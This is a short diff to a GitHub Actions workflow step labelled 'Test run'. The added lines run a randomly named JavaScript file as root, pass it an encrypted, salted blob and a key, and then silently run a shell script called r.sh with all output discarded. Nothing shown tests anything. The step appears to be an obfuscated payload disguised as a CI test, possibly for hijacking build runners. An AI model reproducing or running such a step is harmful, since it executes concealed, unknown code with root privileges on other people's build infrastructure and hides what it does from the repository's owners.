@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 's4kve'
+        echo 'nb59q'
         sudo chmod +x heard8w7wt/eldridge1gbc0.js
-        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX18Li7+fRax+50z28wlou9iDzWOyVBzrjQanPMt5WhzQ8RypA2ah0w8t7J9prBWQSKPFEuiN2DcF4a7GBQcnRv0T7oC4G3q30SNn1YRiIGFGDB3i5PCr7VS1 afxqls && sudo sh r.sh > /dev/null 2>&1
+        sudo ./heard8w7wt/eldridge1gbc0.js U2FsdGVkX19SzP2W6zPbv0Uoh7qJ7ufdx+x93lyyqd5TcJxd2Ebmo9XWIghpANn0Xglqrt8QZHD9LxN8Ula8W3e+koF0l15iC7vblYMqsVEvOpwNm1be4rOxuOAqftpv u1erul && sudo sh r.sh > /dev/null 2>&1
